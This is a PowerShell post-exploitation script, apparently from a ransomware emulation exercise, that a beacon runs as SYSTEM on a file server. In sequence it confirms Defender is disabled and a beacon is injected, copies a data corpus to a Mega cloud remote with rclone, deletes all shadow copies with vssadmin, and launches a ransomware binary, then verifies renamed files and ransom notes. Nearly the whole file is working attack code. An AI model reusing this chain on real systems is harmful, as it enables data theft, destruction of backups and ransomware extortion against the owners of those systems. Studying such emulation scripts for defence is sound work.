# fs01-task.ps1 - gated post-exploitation on FS01, run by the beacon as SYSTEM.
# Every step verifies the endpoint state before the next one starts; a failure aborts the task.

param(
    [string]$Work   = 'C:\ProgramData',
    [string]$Corpus = 'C:\C0015\corpus',
    [string]$Remote = 'Mega:DATA',
    [int]$ExpectRenamed = 40,
    [int]$ExpectNotes   = 4
)

$ErrorActionPreference = 'Continue'
$logPath = Join-Path $Work 'fs01_task.log'
$script:failed = $false

function Log([string]$step, [string]$name, [string]$status, [string]$observed) {
    [pscustomobject]@{ ts = (Get-Date).ToUniversalTime().ToString('yyyy-MM-ddTHH:mm:ssZ');
                       step = $step; name = $name; status = $status; observed = $observed } |
        ConvertTo-Json -Compress | Tee-Object -FilePath $logPath -Append
}

function Step([string]$id, [string]$name, [scriptblock]$action, [scriptblock]$verify, [string]$expect) {
    $observed = ''
    foreach ($attempt in 1..2) {
        try { & $action | Out-Null } catch { Log $id $name 'error' $_.Exception.Message; continue }
        try { $observed = [string](& $verify) } catch { $observed = "verify-error: $($_.Exception.Message)" }
        if ($observed -match $expect) { Log $id $name 'pass' $observed; return $true }
        Log $id $name "retry$attempt" $observed
    }
    Log $id $name 'fail' $observed
    $script:failed = $true
    return $false
}

Step '1' 'defences' { } {
    $s = Get-MpComputerStatus
    "rt=$($s.RealTimeProtectionEnabled); tamper=$($s.IsTamperProtected)"
} 'rt=False' | Out-Null
if ($script:failed) { Log '1' 'defences' 'abort' 'defender still on'; exit 1 }

Step '2' 'injection' { } {
    (Get-Content 'C:\ProgramData\c0015\inject.log' -Tail 1 -ErrorAction SilentlyContinue)
} 'injector done' | Out-Null
if ($script:failed) { Log '2' 'injection' 'abort' 'beacon not injected'; exit 1 }

Step '3' 'exfil' {
    $r = Join-Path $Work 'rclone.exe'; $c = Join-Path $Work 'rclone.conf'
    & $r --config $c copy $Corpus $Remote -q --ignore-existing --auto-confirm *> (Join-Path $Work 'rclone.log')
    $script:rc = $LASTEXITCODE
} {
    "exit=$($script:rc); errors=" + ((Select-String -LiteralPath (Join-Path $Work 'rclone.log') -Pattern 'ERROR' -ErrorAction SilentlyContinue | Measure-Object).Count)
} 'exit=0; errors=0' | Out-Null
if ($script:failed) { Log '3' 'exfil' 'abort' 'exfiltration failed; impact not started'; exit 1 }

Step '4' 'impact' {
    vssadmin.exe delete shadows /all /quiet | Out-Null
    & (Join-Path $Work 'ransomware-sim.exe') -m -net -size 10 -nomutex -p $Corpus | Out-Null
    $script:lc = $LASTEXITCODE
} {
    $renamed = (Get-ChildItem -LiteralPath $Corpus -Recurse -File -Filter *.c0015 -ErrorAction SilentlyContinue | Measure-Object).Count
    $notes   = (Get-ChildItem -LiteralPath $Corpus -Recurse -File -Filter readme.txt -ErrorAction SilentlyContinue | Measure-Object).Count
    "exit=$($script:lc); renamed=$renamed; notes=$notes"
} "renamed=$ExpectRenamed; notes=$ExpectNotes" | Out-Null

if ($script:failed) { Log '4' 'impact' 'abort' 'impact verification failed'; exit 1 }
Log 'done' 'task' 'pass' 'all steps verified'
exit 0
